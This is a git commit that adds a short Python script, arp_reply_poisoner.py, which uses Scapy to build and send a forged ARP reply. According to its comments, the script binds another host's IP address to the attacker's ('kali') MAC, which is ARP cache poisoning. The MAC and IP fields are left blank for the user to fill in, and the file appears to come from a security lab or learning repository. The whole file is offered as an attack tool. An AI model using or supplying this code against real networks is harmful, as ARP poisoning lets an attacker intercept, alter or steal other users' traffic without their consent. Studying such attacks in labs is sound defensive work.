b90b96654b24ad4b7b2b60cc8c80e12a95dc7890
harshitrajpal <76045226+harshitrajpal@users.noreply.github.com>
2022-11-01 22:41:31 -0400

    Create arp_reply_poisoner.py

---
+++ arp_reply_poisoner.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env/python3
+
+from scapy.all import *
+
+#We set ARP options to bind B's mac to M's IP
+#HW src = kali's mac
+#psrc= B's IP
+#hwdst = A's MAC
+#pdst = A's IP
+
+E = Ether()
+E.src = ""
+E.dst = ""
+
+A = ARP()
+A.op = 2
+A.hwsrc = ""
+A.psrc  = ""
+A.hwdst = ""
+A.pdst  = ""
+
+print("Sending the following packet\n")
+p = E/A
+p.show()
+sendp(p)
